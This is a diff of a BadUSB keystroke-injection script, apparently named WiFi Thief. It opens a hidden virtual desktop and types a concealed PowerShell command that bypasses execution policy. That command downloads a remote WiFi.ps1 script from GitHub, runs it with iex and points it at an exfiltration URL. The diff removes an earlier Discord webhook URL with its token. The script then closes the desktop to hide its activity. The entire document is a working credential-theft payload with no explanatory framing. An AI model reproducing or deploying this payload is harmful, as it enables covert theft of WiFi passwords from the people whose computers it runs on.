@@ -1,5 +1,31 @@
+GUI-CTRL d
+
+DELAY 1200
+
+NUMLOCK
+
 GUI r
-ENTER
+
+ALTSTRING powershell -w h -NoP -Ep Bypass  $dc='https://clck.ru/3CR9QN'; irm https://raw.githubusercontent.com/ARGimadeyev/BadUSB/main/WiFi_Thief/WiFi.ps1 | iex
+
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1227962310795202571/2Rv1wGMwe5dTBqNYNDn6S_UYJ4JN4O6783tmlrnRUnMaa2S7fSOrYHdhxplyNW1-4o7Z'; irm https://raw.githubusercontent.com/ARGimadeyev/BadUSB/main/WiFi.ps1 | iex
+
 ENTER
+DELAY 500
+ENTER
+
+NUMLOCK
+
+GUI r
+
+ALTSTRING powershell -w h -NoP -Ep Bypass  $dc='https://clck.ru/3CR9QN'; irm https://raw.githubusercontent.com/ARGimadeyev/BadUSB/main/WiFi_Thief/WiFi.ps1 | iex
+
+DELAY 800
+
+ENTER
+DELAY 500
+ENTER
+
+DELAY 1000
+
+GUI-CTRL F4
